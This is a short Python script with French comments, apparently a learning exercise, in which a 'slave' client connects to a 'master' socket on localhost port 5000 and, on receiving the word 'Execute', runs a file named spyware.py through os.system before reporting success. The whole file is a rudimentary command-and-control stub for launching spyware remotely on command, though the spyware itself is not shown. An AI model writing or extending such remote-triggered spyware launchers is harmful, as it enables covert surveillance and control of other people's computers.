import socket as modSocket
import os 

machine_maitre = (("localhost", 5000))

s = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)


def start_log(s):
    #le slave ce connecte au maitre
    s.connect(machine_maitre)
    #si le message reçu du maitre correspond à Execute le slave va lancer les commande suivante
    if s.recv(1024) == b"Execute":
        print("OK !!!")
        #os.system permet de lancer des programmes externe au fichier en lui même
        os.system("spyware.py")
    #içi le client re envoie un message au maitre pour lui dire que tous c'est bien passer
    s.send("OK c'est fait !!!".encode("utf-8"))

start_log(s)
s.close()
